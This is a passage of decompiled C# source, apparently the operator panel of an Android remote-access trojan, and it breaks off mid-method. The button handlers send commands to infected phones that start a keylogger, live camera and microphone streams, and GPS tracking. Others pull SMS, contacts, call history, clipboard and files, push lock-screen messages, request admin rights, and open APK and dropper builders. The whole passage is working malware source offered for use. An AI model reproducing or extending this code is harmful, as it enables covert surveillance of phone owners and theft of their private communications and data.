											Data.SPL_SOCKET,
											client.ClientRemoteAddress
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(parametersObjects);
								}
								else
								{
									string name = "Camera_Manager_" + client.ClientRemoteAddress;
									CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
									if (cameraManager != null)
									{
										break;
									}
									cameraManager = new CameraManager();
									cameraManager.Name = name;
									cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
									cameraManager.classClient = client;
									if (cameraManager.classClient != null)
									{
										reso.Directory_Exist(cameraManager.classClient);
										cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
									}
									cameraManager.Client = client.myClient;
									cameraManager.classCamera = client;
									cameraManager.TempImage = new PictureBox();
									cameraManager.combotext.Visible = false;
									cameraManager.combosizes.Visible = false;
									cameraManager.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000474 RID: 1140 RVA: 0x0005AC48 File Offset: 0x00058E48
	private void drakeUIButtonIcon2_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string name = "Microphone_" + client.ClientRemoteAddress;
								Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
								if (microphone == null)
								{
									string[] array = client.Keys.Split(new char[]
									{
										':'
									});
									if (array.Length < infoServer.KeySize)
									{
										break;
									}
									object[] parametersObjects = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient1,
											Data.SPL_SOCKET,
											reso.domen,
											".microphone",
											Data.SPL_SOCKET,
											"method",
											Data.SPL_SOCKET,
											SecurityKey.resultClient,
											Data.SPL_SOCKET,
											"start",
											Data.SPL_DATA,
											array[0],
											Data.SPL_DATA,
											array[1],
											Data.SPL_DATA,
											"8000",
											Data.SPL_DATA,
											SecurityKey.MicwaveOutByte,
											Data.SPL_DATA,
											client.ClientRemoteAddress,
											Data.SPL_DATA,
											"0"
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(parametersObjects);
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000475 RID: 1141 RVA: 0x0005AEA4 File Offset: 0x000590A4
	private void drakeUIButtonIcon35_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							string name = "Keylogger_" + client.ClientRemoteAddress;
							Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[name];
							if (client != null && keylogger == null)
							{
								keylogger = new Keylogger();
								keylogger.Name = name;
								keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
								keylogger.Client = client.myClient;
								keylogger.classClient = client;
								keylogger.DGV0.Columns[3].Width = 48;
								keylogger.DGV0.Columns[3].DisplayIndex = 0;
								keylogger.tmpAddressIP = client.ClientAddressIP;
								keylogger.tmpClientName = client.ClientName;
								keylogger.tmpCountry = client.Country;
								keylogger.tmpFolderUSER = client.FolderUSER;
								client.Keylogg = true;
								keylogger.Show();
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000476 RID: 1142 RVA: 0x0005B088 File Offset: 0x00059288
	private void drakeUIButtonIcon30_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient3,
										Data.SPL_SOCKET,
										Data.SPL_DATA,
										Data.SPL_SOCKET,
										SecurityKey.getGPS
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000477 RID: 1143 RVA: 0x0005DFFC File Offset: 0x0005C1FC
	private void drakeUIButtonIcon38_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								Dialog1 dialog = new Dialog1();
								dialog.Title = "Enter Link";
								dialog.ShowDialog();
								if (dialog.DialogResult != DialogResult.OK)
								{
									break;
								}
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"lnk<*>",
										reso.ChekLink(dialog.Mytext.Text),
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000478 RID: 1144 RVA: 0x0005F768 File Offset: 0x0005D968
	private void drakeUIButtonIcon29_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				Client client = (Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
				if (client.isconnected)
				{
					TcpClient myClient = client.myClient;
					Dialog1 dialog = new Dialog1();
					dialog.Title = "Enter Messege";
					dialog.ShowDialog();
					if (dialog.DialogResult == DialogResult.OK)
					{
						string[] array = client.Keys.Split(new char[]
						{
							':'
						});
						object[] parametersObjects = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"msg:",
								dialog.Mytext.Text,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								client.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000479 RID: 1145 RVA: 0x0005A040 File Offset: 0x00058240
	private void drakeUIButtonIcon26_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".contacts",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getContacts,
										Data.SPL_SOCKET,
										"contacts"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600047A RID: 1146 RVA: 0x0005E220 File Offset: 0x0005C420
	private void drakeUIButtonIcon24_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Notifications_" + client.ClientAddressIP;
								Eaglepopup eaglepopup = (Eaglepopup)MyProject.Application.OpenForms[name];
								if (eaglepopup == null)
								{
									new Eaglepopup
									{
										Location = this.ClientsWindow.PointToScreen(this.ClientsWindow.GetCellDisplayRectangle(0, dataGridViewRow.Index, false).Location),
										ClassClient = client
									}.Show();
									dataGridViewRow.Cells[8].Value = Codes.BlankImage();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600047B RID: 1147 RVA: 0x0000206C File Offset: 0x0000026C
	private void drakeUIButtonIcon21_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x0600047C RID: 1148 RVA: 0x00077898 File Offset: 0x00075A98
	private void drakeUIButtonIcon34_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"sp<*>LK",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600047D RID: 1149 RVA: 0x0005BCAC File Offset: 0x00059EAC
	private void drakeUIButtonIcon23_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".sms",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getSMS,
										Data.SPL_SOCKET,
										"sms",
										Data.SPL_DATA,
										"content://sms/"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600047E RID: 1150 RVA: 0x0005BB14 File Offset: 0x00059D14
	private void drakeUIButtonIcon15_Click_1(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								object[] parametersObjects = new object[]
								{
									client.myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getfiles,
										Data.SPL_SOCKET,
										"files",
										Data.SPL_DATA,
										"get0"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600047F RID: 1151 RVA: 0x0005D1FC File Offset: 0x0005B3FC
	private void drakeUIButtonIcon31_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000480 RID: 1152 RVA: 0x0000206C File Offset: 0x0000026C
	private void drakeUIButtonIcon25_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x06000481 RID: 1153 RVA: 0x0005EB48 File Offset: 0x0005CD48
	private void drakeUIButtonIcon37_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "SelfRemove_" + client.ClientAddressIP;
								SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
								if (selfRemove == null)
								{
									new SelfRemove
									{
										Classclient = client
									}.Show();
								}
								else
								{
									selfRemove.BringToFront();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000482 RID: 1154 RVA: 0x0005DE60 File Offset: 0x0005C060
	private void drakeUIButtonIcon28_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getClipboard,
										Data.SPL_SOCKET,
										"get",
										Data.SPL_DATA,
										"null"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000483 RID: 1155 RVA: 0x00077A7C File Offset: 0x00075C7C
	private void drakeUIButtonIcon36_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"sp<*>LKeb",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										client.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000484 RID: 1156 RVA: 0x00077C60 File Offset: 0x00075E60
	private void Guna2GradientButton20_Click(object sender, EventArgs e)
	{
		ApkBuilder apkBuilder = new ApkBuilder();
		apkBuilder.Show();
	}

	// Token: 0x06000485 RID: 1157 RVA: 0x00002A5D File Offset: 0x00000C5D
	private void ClientsButton_Click(object sender, EventArgs e)
	{
		this.ClientsWindow.BringToFront();
	}

	// Token: 0x06000486 RID: 1158 RVA: 0x00002A6A File Offset: 0x00000C6A
	private void ClientsLogs_Click(object sender, EventArgs e)
	{
		this.DataLog.BringToFront();
		this.DataLog.Visible = true;
	}

	// Token: 0x06000487 RID: 1159 RVA: 0x00002A83 File Offset: 0x00000C83
	private void guna2GradientButton3_Click(object sender, EventArgs e)
	{
		this.DGVblocked.BringToFront();
	}

	// Token: 0x06000488 RID: 1160 RVA: 0x00002A90 File Offset: 0x00000C90
	private void guna2GradientButton4_Click(object sender, EventArgs e)
	{
		Process.Start("https://telegram.me/darkxsoft");
	}

	// Token: 0x06000489 RID: 1161 RVA: 0x0000206C File Offset: 0x0000026C
	private void Guna2GradientButton22_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x0600048A RID: 1162 RVA: 0x00059A1C File Offset: 0x00057C1C
	private void panel1_MouseDown_1(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x0600048B RID: 1163 RVA: 0x00077C60 File Offset: 0x00075E60
	private void guna2GradientButton5_Click(object sender, EventArgs e)
	{
		ApkBuilder apkBuilder = new ApkBuilder();
		apkBuilder.Show();
	}

	// Token: 0x0600048C RID: 1164 RVA: 0x00077C7C File Offset: 0x00075E7C
	private void drakeUIButtonIcon3_Click_1(object sender, EventArgs e)
	{
		Drooper drooper = new Drooper();
		drooper.Show();
	}

	// Token: 0x0600048D RID: 1165 RVA: 0x00002858 File Offset: 0x00000A58
	private void Guna2Button5_Click(object sender, EventArgs e)
	{
		base.Close();
	}

	// Token: 0x0600048E RID: 1166 RVA: 0x000029F7 File Offset: 0x00000BF7
	private void PictureBox9_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	// Token: 0x0600048F RID: 1167 RVA: 0x0000206C File Offset: 0x0000026C
	private void LiveScreenControlToolsTrip_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x06000490 RID: 1168 RVA: 0x0005BB14 File Offset: 0x00059D14
	private void FileManagerToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								object[] parametersObjects = new object[]
								{
									client.myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getfiles,
										Data.SPL_SOCKET,
										"files",
										Data.SPL_DATA,
										"get0"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000491 RID: 1169 RVA: 0x0005A96C File Offset: 0x00058B6C
	private void LiveCameraStreamToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								int value = 0;
								int value2 = 0;
								if (client.Isv4)
								{
									object[] parametersObjects = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient2,
											Data.SPL_SOCKET,
											"lcm<*>",
											client.ClientRemoteAddress,
											Data.SPL_SOCKET,
											array[0],
											Data.SPL_SOCKET,
											array[1],
											Data.SPL_SOCKET,
											SecurityKey.Lockscreen,
											Data.SPL_SOCKET,
											Conversions.ToString(value),
											Data.SPL_SOCKET,
											Conversions.ToString(value2),
											Data.SPL_SOCKET,
											Data.SPL_ARRAY,
											Data.SPL_SOCKET,
											client.ClientRemoteAddress
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(parametersObjects);
								}
								else
								{
									string name = "Camera_Manager_" + client.ClientRemoteAddress;
									CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
									if (cameraManager != null)
									{
										break;
									}
									cameraManager = new CameraManager();
									cameraManager.Name = name;
									cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
									cameraManager.classClient = client;
									if (cameraManager.classClient != null)
									{
										reso.Directory_Exist(cameraManager.classClient);
										cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
									}
									cameraManager.Client = client.myClient;
									cameraManager.classCamera = client;
									cameraManager.TempImage = new PictureBox();
									cameraManager.combotext.Visible = false;
									cameraManager.combosizes.Visible = false;
									cameraManager.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000492 RID: 1170 RVA: 0x0005C7C8 File Offset: 0x0005A9C8
	private void LiveMicrophoneToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string name = "Microphone_" + client.ClientRemoteAddress;
								Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
								if (microphone == null)
								{
									string[] array = client.Keys.Split(new char[]
									{
										':'
									});
									if (array.Length < infoServer.KeySize)
									{
										break;
									}
									object[] parametersObjects = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient1,
											Data.SPL_SOCKET,
											reso.domen,
											".microphone",
											Data.SPL_SOCKET,
											"method",
											Data.SPL_SOCKET,
											SecurityKey.resultClient,
											Data.SPL_SOCKET,
											"start",
											Data.SPL_DATA,
											array[0],
											Data.SPL_DATA,
											array[1],
											Data.SPL_DATA,
											"8000",
											Data.SPL_DATA,
											SecurityKey.MicwaveOutByte,
											Data.SPL_DATA,
											client.ClientRemoteAddress,
											Data.SPL_DATA,
											"0"
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(parametersObjects);
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000493 RID: 1171 RVA: 0x0005A7E4 File Offset: 0x000589E4
	private void ScreenReaderToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "SC_Readv2_" + client.ClientAddressIP;
								ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
								if (screenReaderV == null)
								{
									new ScreenReaderV2
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000494 RID: 1172 RVA: 0x0005CA1C File Offset: 0x0005AC1C
	private void LiveLocationToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient3,
										Data.SPL_SOCKET,
										Data.SPL_DATA,
										Data.SPL_SOCKET,
										SecurityKey.getGPS
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000495 RID: 1173 RVA: 0x0005C680 File Offset: 0x0005A880
	private void ScreenLoggerToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Screen_Reader_" + client.ClientRemoteAddress;
								ScreenReader screenReader = (ScreenReader)MyProject.Application.OpenForms[name];
								if (screenReader == null)
								{
									new ScreenReader
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Screen Reader", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										Classclient = client
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000496 RID: 1174 RVA: 0x0005BE48 File Offset: 0x0005A048
	private void CallsHistoryToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".calls",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getCalls,
										Data.SPL_SOCKET,
										"calls"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000497 RID: 1175 RVA: 0x0005BFD4 File Offset: 0x0005A1D4
	private void ContactsListToolsTrip_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".contacts",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
